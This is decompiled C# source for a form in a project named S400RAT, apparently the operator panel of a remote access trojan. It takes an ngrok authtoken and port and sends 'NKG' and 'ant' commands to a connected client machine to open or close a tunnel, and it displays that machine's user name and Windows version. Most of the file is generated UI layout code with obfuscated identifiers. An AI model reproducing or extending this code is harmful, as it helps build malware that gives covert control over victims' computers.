using System;
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Guna.UI2.WinForms.Enums;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using SQLABC_ModernUI;

namespace S400RAT;

[DesignerGenerated]
public class congrok : Form
{
	public IContainer icontainer_0;

	[CompilerGenerated]
	[AccessedThroughProperty("panel5")]
	public Panel panel_0;

	[AccessedThroughProperty("n")]
	[CompilerGenerated]
	public Label label_0;

	[AccessedThroughProperty("w")]
	[CompilerGenerated]
	public Label label_1;

	[CompilerGenerated]
	[AccessedThroughProperty("PictureBox1")]
	public PictureBox pictureBox_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Label2")]
	public Label label_2;

	[AccessedThroughProperty("Label7")]
	[CompilerGenerated]
	public Label label_3;

	[AccessedThroughProperty("Label1")]
	[CompilerGenerated]
	public Label label_4;

	[AccessedThroughProperty("pictureBox3")]
	[CompilerGenerated]
	public PictureBox pictureBox_1;

	[AccessedThroughProperty("label9")]
	[CompilerGenerated]
	public Label label_5;

	[AccessedThroughProperty("Guna2ControlBox1")]
	[CompilerGenerated]
	public Guna2ControlBox guna2ControlBox_0;

	[AccessedThroughProperty("Guna2AnimateWindow1")]
	[CompilerGenerated]
	public Guna2AnimateWindow guna2AnimateWindow_0;

	[CompilerGenerated]
	[AccessedThroughProperty("Guna2BorderlessForm1")]
	public Guna2BorderlessForm guna2BorderlessForm_0;

	[AccessedThroughProperty("Panel1")]
	[CompilerGenerated]
	public Panel panel_1;

	[AccessedThroughProperty("Label5")]
	[CompilerGenerated]
	public Label label_6;

	[AccessedThroughProperty("PictureBox2")]
	[CompilerGenerated]
	public PictureBox pictureBox_2;

	[CompilerGenerated]
	[AccessedThroughProperty("bngrok")]
	public Guna2GradientButton guna2GradientButton_0;

	[AccessedThroughProperty("key_ngrok")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_0;

	[AccessedThroughProperty("Label6")]
	[CompilerGenerated]
	public Label label_7;

	[AccessedThroughProperty("Port")]
	[CompilerGenerated]
	public Guna2TextBox guna2TextBox_1;

	[CompilerGenerated]
	[AccessedThroughProperty("SqlabC_ControlMini1")]
	public SQLABC_ControlMini sqlabc_ControlMini_0;

	[AccessedThroughProperty("Clos")]
	[CompilerGenerated]
	public Timer timer_0;

	public Client C;

	public virtual Panel panel5
	{
		[CompilerGenerated]
		get
		{
			return panel_0;
		}
		[CompilerGenerated]
		set
		{
			panel_0 = value;
		}
	}

	internal virtual Label n
	{
		[CompilerGenerated]
		get
		{
			return label_0;
		}
		[CompilerGenerated]
		set
		{
			label_0 = value;
		}
	}

	internal virtual Label w
	{
		[CompilerGenerated]
		get
		{
			return label_1;
		}
		[CompilerGenerated]
		set
		{
			label_1 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_0;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_0 = value;
		}
	}

	public virtual Label Label2
	{
		[CompilerGenerated]
		get
		{
			return label_2;
		}
		[CompilerGenerated]
		set
		{
			label_2 = value;
		}
	}

	public virtual Label Label7
	{
		[CompilerGenerated]
		get
		{
			return label_3;
		}
		[CompilerGenerated]
		set
		{
			label_3 = value;
		}
	}

	public virtual Label Label1
	{
		[CompilerGenerated]
		get
		{
			return label_4;
		}
		[CompilerGenerated]
		set
		{
			label_4 = value;
		}
	}

	public virtual PictureBox pictureBox3
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_1;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_1 = value;
		}
	}

	public virtual Label label9
	{
		[CompilerGenerated]
		get
		{
			return label_5;
		}
		[CompilerGenerated]
		set
		{
			label_5 = value;
		}
	}

	internal virtual Guna2ControlBox Guna2ControlBox1
	{
		[CompilerGenerated]
		get
		{
			return guna2ControlBox_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_3;
			Guna2ControlBox guna2ControlBox = guna2ControlBox_0;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click -= value2;
			}
			guna2ControlBox_0 = value;
			guna2ControlBox = guna2ControlBox_0;
			if (guna2ControlBox != null)
			{
				guna2ControlBox.Click += value2;
			}
		}
	}

	public virtual Panel Panel1
	{
		[CompilerGenerated]
		get
		{
			return panel_1;
		}
		[CompilerGenerated]
		set
		{
			panel_1 = value;
		}
	}

	public virtual Label Label5
	{
		[CompilerGenerated]
		get
		{
			return label_6;
		}
		[CompilerGenerated]
		set
		{
			label_6 = value;
		}
	}

	public virtual PictureBox PictureBox2
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_2;
		}
		[CompilerGenerated]
		set
		{
			pictureBox_2 = value;
		}
	}

	internal virtual Guna2GradientButton bngrok
	{
		[CompilerGenerated]
		get
		{
			return guna2GradientButton_0;
		}
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_1;
			Guna2GradientButton guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click -= value2;
			}
			guna2GradientButton_0 = value;
			guna2GradientButton = guna2GradientButton_0;
			if (guna2GradientButton != null)
			{
				guna2GradientButton.Click += value2;
			}
		}
	}

	internal virtual Guna2TextBox key_ngrok
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_0;
		}
		[CompilerGenerated]
		set
		{
			guna2TextBox_0 = value;
		}
	}

	public virtual Label Label6
	{
		[CompilerGenerated]
		get
		{
			return label_7;
		}
		[CompilerGenerated]
		set
		{
			label_7 = value;
		}
	}

	internal virtual Guna2TextBox Port
	{
		[CompilerGenerated]
		get
		{
			return guna2TextBox_1;
		}
		[CompilerGenerated]
		set
		{
			KeyPressEventHandler value2 = method_2;
			Guna2TextBox guna2TextBox = guna2TextBox_1;
			if (guna2TextBox != null)
			{
				guna2TextBox.KeyPress -= value2;
			}
			guna2TextBox_1 = value;
			guna2TextBox = guna2TextBox_1;
			if (guna2TextBox != null)
			{
				guna2TextBox.KeyPress += value2;
			}
		}
	}

	internal virtual SQLABC_ControlMini SqlabC_ControlMini1
	{
		[CompilerGenerated]
		get
		{
			return sqlabc_ControlMini_0;
		}
		[CompilerGenerated]
		set
		{
			sqlabc_ControlMini_0 = value;
		}
	}

	public congrok()
	{
		base.Load += congrok_Load;
		method_0();
	}

	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	public void method_0()
	{
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(congrok));
		panel5 = new Panel();
		n = new Label();
		w = new Label();
		PictureBox1 = new PictureBox();
		Label2 = new Label();
		Label7 = new Label();
		Label1 = new Label();
		pictureBox3 = new PictureBox();
		label9 = new Label();
		Guna2ControlBox1 = new Guna2ControlBox();
		vmethod_1(new Guna2AnimateWindow(icontainer_0));
		vmethod_3(new Guna2BorderlessForm(icontainer_0));
		Panel1 = new Panel();
		Port = new Guna2TextBox();
		Label5 = new Label();
		PictureBox2 = new PictureBox();
		bngrok = new Guna2GradientButton();
		key_ngrok = new Guna2TextBox();
		Label6 = new Label();
		SqlabC_ControlMini1 = new SQLABC_ControlMini();
		vmethod_5(new Timer(icontainer_0));
		panel5.SuspendLayout();
		((ISupportInitialize)PictureBox1).BeginInit();
		((ISupportInitialize)pictureBox3).BeginInit();
		Panel1.SuspendLayout();
		((ISupportInitialize)PictureBox2).BeginInit();
		SuspendLayout();
		panel5.Anchor = AnchorStyles.Top | AnchorStyles.Left | AnchorStyles.Right;
		panel5.BackColor = Color.FromArgb(37, 42, 64);
		panel5.Controls.Add(n);
		panel5.Controls.Add(w);
		panel5.Controls.Add(PictureBox1);
		panel5.Controls.Add(Label2);
		panel5.Controls.Add(Label7);
		panel5.Controls.Add(Label1);
		panel5.Controls.Add(pictureBox3);
		panel5.Controls.Add(label9);
		panel5.Location = new Point(-4, 0);
		panel5.Name = "panel5";
		panel5.Size = new Size(343, 124);
		panel5.TabIndex = 128;
		n.AutoSize = true;
		n.Font = new Font("Nirmala UI", 9.75f);
		n.ForeColor = Color.FromArgb(158, 161, 176);
		n.Location = new Point(94, 81);
		n.Name = "n";
		n.Size = new Size(18, 17);
		n.TabIndex = 109;
		n.Text = "--";
		w.AutoSize = true;
		w.Font = new Font("Nirmala UI", 9.75f);
		w.ForeColor = Color.FromArgb(158, 161, 176);
		w.Location = new Point(94, 102);
		w.Name = "w";
		w.Size = new Size(18, 17);
		w.TabIndex = 108;
		w.Text = "--";
		PictureBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		PictureBox1.Image = (Image)componentResourceManager.GetObject("PictureBox1.Image");
		PictureBox1.Location = new Point(282, 7);
		PictureBox1.Name = "PictureBox1";
		PictureBox1.Size = new Size(53, 38);
		PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox1.TabIndex = 107;
		PictureBox1.TabStop = false;
		Label2.AutoSize = true;
		Label2.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label2.ForeColor = Color.White;
		Label2.Location = new Point(4, 7);
		Label2.Name = "Label2";
		Label2.Size = new Size(166, 25);
		Label2.TabIndex = 106;
		Label2.Text = "Ngrok Connection";
		Label7.AutoSize = true;
		Label7.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label7.ForeColor = Color.FromArgb(158, 161, 176);
		Label7.Location = new Point(19, 100);
		Label7.Name = "Label7";
		Label7.Size = new Size(68, 17);
		Label7.TabIndex = 4;
		Label7.Text = "Windows :";
		Label1.AutoSize = true;
		Label1.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label1.ForeColor = Color.FromArgb(158, 161, 176);
		Label1.Location = new Point(6, 79);
		Label1.Name = "Label1";
		Label1.Size = new Size(81, 17);
		Label1.TabIndex = 3;
		Label1.Text = "User Name :";
		pictureBox3.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		pictureBox3.Image = (Image)componentResourceManager.GetObject("pictureBox3.Image");
		pictureBox3.Location = new Point(282, 59);
		pictureBox3.Name = "pictureBox3";
		pictureBox3.Size = new Size(53, 58);
		pictureBox3.SizeMode = PictureBoxSizeMode.Zoom;
		pictureBox3.TabIndex = 2;
		pictureBox3.TabStop = false;
		label9.AutoSize = true;
		label9.Font = new Font("Nirmala UI", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 0);
		label9.ForeColor = Color.FromArgb(84, 131, 255);
		label9.Location = new Point(4, 44);
		label9.Name = "label9";
		label9.Size = new Size(111, 25);
		label9.TabIndex = 0;
		label9.Text = "Information";
		Guna2ControlBox1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		Guna2ControlBox1.BackColor = Color.Transparent;
		Guna2ControlBox1.BorderColor = Color.Transparent;
		Guna2ControlBox1.FillColor = Color.FromArgb(46, 51, 73);
		Guna2ControlBox1.HoverState.Parent = Guna2ControlBox1;
		Guna2ControlBox1.IconColor = Color.White;
		Guna2ControlBox1.Location = new Point(469, 0);
		Guna2ControlBox1.Name = "Guna2ControlBox1";
		Guna2ControlBox1.PressedColor = Color.FromArgb(24, 30, 54);
		Guna2ControlBox1.ShadowDecoration.Parent = Guna2ControlBox1;
		Guna2ControlBox1.Size = new Size(47, 32);
		Guna2ControlBox1.TabIndex = 127;
		vmethod_0().AnimationType = Guna2AnimateWindow.AnimateWindowType.AW_BLEND;
		vmethod_0().TargetForm = this;
		vmethod_2().ContainerControl = this;
		Panel1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
		Panel1.BackColor = Color.FromArgb(37, 42, 64);
		Panel1.Controls.Add(Port);
		Panel1.Controls.Add(Label5);
		Panel1.Controls.Add(PictureBox2);
		Panel1.Controls.Add(bngrok);
		Panel1.Controls.Add(key_ngrok);
		Panel1.Controls.Add(Label6);
		Panel1.ForeColor = Color.FromArgb(37, 42, 64);
		Panel1.Location = new Point(9, 143);
		Panel1.Name = "Panel1";
		Panel1.Size = new Size(497, 178);
		Panel1.TabIndex = 129;
		Port.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
		Port.Animated = true;
		Port.AutoRoundedCorners = true;
		Port.BackColor = Color.FromArgb(46, 51, 73);
		Port.BorderColor = Color.Silver;
		Port.BorderRadius = 13;
		Port.BorderStyle = DashStyle.Custom;
		Port.Cursor = Cursors.IBeam;
		Port.DefaultText = "";
		Port.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		Port.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		Port.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		Port.DisabledState.Parent = Port;
		Port.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		Port.FillColor = Color.FromArgb(37, 42, 64);
		Port.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		Port.FocusedState.Parent = Port;
		Port.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		Port.ForeColor = Color.White;
		Port.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		Port.HoverState.Parent = Port;
		Port.IconLeft = (Image)componentResourceManager.GetObject("Port.IconLeft");
		Port.IconLeftCursor = Cursors.Hand;
		Port.Location = new Point(362, 69);
		Port.Margin = new Padding(3, 2, 3, 2);
		Port.Name = "Port";
		Port.PasswordChar = '\0';
		Port.PlaceholderForeColor = Color.Gray;
		Port.PlaceholderText = "Port";
		Port.SelectedText = "";
		Port.ShadowDecoration.Parent = Port;
		Port.Size = new Size(109, 29);
		Port.Style = TextBoxStyle.Material;
		Port.TabIndex = 87;
		Port.TextAlign = HorizontalAlignment.Center;
		Label5.AutoSize = true;
		Label5.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label5.ForeColor = Color.FromArgb(158, 161, 176);
		Label5.Location = new Point(3, 27);
		Label5.Name = "Label5";
		Label5.Size = new Size(196, 34);
		Label5.TabIndex = 82;
		Label5.Text = "You Have to Install Ngrok First\r\nBefore You Put Ngrok Authtoken";
		PictureBox2.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		PictureBox2.Image = (Image)componentResourceManager.GetObject("PictureBox2.Image");
		PictureBox2.Location = new Point(442, 6);
		PictureBox2.Name = "PictureBox2";
		PictureBox2.Size = new Size(48, 30);
		PictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
		PictureBox2.TabIndex = 76;
		PictureBox2.TabStop = false;
		bngrok.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
		bngrok.Animated = true;
		bngrok.AutoRoundedCorners = true;
		bngrok.BackColor = Color.Transparent;
		bngrok.BorderRadius = 22;
		bngrok.CheckedState.Parent = bngrok;
		bngrok.CustomImages.Parent = bngrok;
		bngrok.FillColor = Color.FromArgb(24, 30, 54);
		bngrok.FillColor2 = Color.FromArgb(24, 30, 54);
		bngrok.Font = new Font("Segoe UI", 9f);
		bngrok.ForeColor = Color.White;
		bngrok.HoverState.Parent = bngrok;
		bngrok.IndicateFocus = true;
		bngrok.Location = new Point(212, 119);
		bngrok.Name = "bngrok";
		bngrok.ShadowDecoration.Parent = bngrok;
		bngrok.Size = new Size(278, 46);
		bngrok.TabIndex = 80;
		bngrok.Text = "Connect";
		bngrok.UseTransparentBackground = true;
		key_ngrok.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
		key_ngrok.Animated = true;
		key_ngrok.AutoRoundedCorners = true;
		key_ngrok.BackColor = Color.FromArgb(46, 51, 73);
		key_ngrok.BorderColor = Color.Silver;
		key_ngrok.BorderRadius = 13;
		key_ngrok.BorderStyle = DashStyle.Custom;
		key_ngrok.Cursor = Cursors.IBeam;
		key_ngrok.DefaultText = "";
		key_ngrok.DisabledState.BorderColor = Color.FromArgb(208, 208, 208);
		key_ngrok.DisabledState.FillColor = Color.FromArgb(226, 226, 226);
		key_ngrok.DisabledState.ForeColor = Color.FromArgb(138, 138, 138);
		key_ngrok.DisabledState.Parent = key_ngrok;
		key_ngrok.DisabledState.PlaceholderForeColor = Color.FromArgb(138, 138, 138);
		key_ngrok.FillColor = Color.FromArgb(37, 42, 64);
		key_ngrok.FocusedState.BorderColor = Color.FromArgb(94, 148, 255);
		key_ngrok.FocusedState.Parent = key_ngrok;
		key_ngrok.Font = new Font("Segoe UI Semibold", 9f, FontStyle.Bold);
		key_ngrok.ForeColor = Color.White;
		key_ngrok.HoverState.BorderColor = Color.FromArgb(94, 148, 255);
		key_ngrok.HoverState.Parent = key_ngrok;
		key_ngrok.IconLeft = (Image)componentResourceManager.GetObject("key_ngrok.IconLeft");
		key_ngrok.IconLeftCursor = Cursors.Hand;
		key_ngrok.Location = new Point(8, 69);
		key_ngrok.Margin = new Padding(3, 2, 3, 2);
		key_ngrok.Name = "key_ngrok";
		key_ngrok.PasswordChar = '\0';
		key_ngrok.PlaceholderForeColor = Color.Gray;
		key_ngrok.PlaceholderText = "Your Authtoken";
		key_ngrok.SelectedText = "";
		key_ngrok.ShadowDecoration.Parent = key_ngrok;
		key_ngrok.Size = new Size(348, 29);
		key_ngrok.Style = TextBoxStyle.Material;
		key_ngrok.TabIndex = 86;
		key_ngrok.TextAlign = HorizontalAlignment.Center;
		Label6.AutoSize = true;
		Label6.Font = new Font("Nirmala UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 0);
		Label6.ForeColor = Color.White;
		Label6.Location = new Point(3, 6);
		Label6.Name = "Label6";
		Label6.Size = new Size(112, 17);
		Label6.TabIndex = 1;
		Label6.Text = "Ngrok connection";
		SqlabC_ControlMini1.Anchor = AnchorStyles.Top | AnchorStyles.Right;
		SqlabC_ControlMini1.BackColor = Color.White;
		SqlabC_ControlMini1.BaseColor = Color.FromArgb(46, 51, 73);
		SqlabC_ControlMini1.Font = new Font("Marlett", 12f);
		SqlabC_ControlMini1.Location = new Point(451, 7);
		SqlabC_ControlMini1.Name = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.Size = new Size(18, 18);
		SqlabC_ControlMini1.TabIndex = 134;
		SqlabC_ControlMini1.Text = "SqlabC_ControlMini1";
		SqlabC_ControlMini1.TextColor = Color.FromArgb(243, 243, 243);
		vmethod_4().Enabled = true;
		vmethod_4().Interval = 10;
		base.AutoScaleDimensions = new SizeF(6f, 13f);
		base.AutoScaleMode = AutoScaleMode.Font;
		BackColor = Color.FromArgb(46, 51, 73);
		base.ClientSize = new Size(518, 330);
		base.Controls.Add(SqlabC_ControlMini1);
		base.Controls.Add(Panel1);
		base.Controls.Add(panel5);
		base.Controls.Add(Guna2ControlBox1);
		base.FormBorderStyle = FormBorderStyle.None;
		base.Name = "congrok";
		Text = "congrok";
		panel5.ResumeLayout(performLayout: false);
		panel5.PerformLayout();
		((ISupportInitialize)PictureBox1).EndInit();
		((ISupportInitialize)pictureBox3).EndInit();
		Panel1.ResumeLayout(performLayout: false);
		Panel1.PerformLayout();
		((ISupportInitialize)PictureBox2).EndInit();
		ResumeLayout(performLayout: false);
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2AnimateWindow vmethod_0()
	{
		return guna2AnimateWindow_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_1(Guna2AnimateWindow WithEventsValue)
	{
		guna2AnimateWindow_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Guna2BorderlessForm vmethod_2()
	{
		return guna2BorderlessForm_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_3(Guna2BorderlessForm WithEventsValue)
	{
		guna2BorderlessForm_0 = WithEventsValue;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual Timer vmethod_4()
	{
		return timer_0;
	}

	[SpecialName]
	[CompilerGenerated]
	internal virtual void vmethod_5(Timer WithEventsValue)
	{
		EventHandler value = method_5;
		Timer timer = timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		timer_0 = WithEventsValue;
		timer = timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	public void congrok_Load(object sender, EventArgs e)
	{
		C.Send("Admin" + Class7.string_1);
	}

	public void method_1(object sender, EventArgs e)
	{
		if (Operators.CompareString(bngrok.Text, "Connect", TextCompare: false) == 0)
		{
			Class2.XTBfo6WOm.NGR.Button1.Text = "Connect...";
			Class2.XTBfo6WOm.NGR.Button1.Enabled = false;
			C.Send("NKG" + Class7.string_1 + key_ngrok.Text + Class7.string_1 + Port.Text);
		}
		if (Operators.CompareString(bngrok.Text, "Disconnect", TextCompare: false) == 0)
		{
			C.Send("ant" + Class7.string_1);
			if (C != null)
			{
				C.CN = false;
			}
			Close();
		}
		if (Operators.CompareString(bngrok.Text, "Failed, try again", TextCompare: false) == 0)
		{
			Class2.XTBfo6WOm.NGR.Button1.Text = "Failed, try again...";
			Class2.XTBfo6WOm.NGR.Button1.Enabled = false;
			C.Send("NKG" + Class7.string_1 + key_ngrok.Text + Class7.string_1 + Port.Text);
		}
	}

	public void method_2(object sender, KeyPressEventArgs e)
	{
		try
		{
			if (!Versioned.IsNumeric(e.KeyChar))
			{
				Interaction.MsgBox("Please, Enter The Number", MsgBoxStyle.Exclamation, "Sorry !!");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void method_3(object sender, EventArgs e)
	{
		if (C != null)
		{
			C.CN = false;
		}
	}

	public void method_4(object sender, EventArgs e)
	{
		Hide();
	}

	public void method_5(object sender, EventArgs e)
	{
		if (!C.CN)
		{
			C.CN = false;
			Close();
		}
	}
}
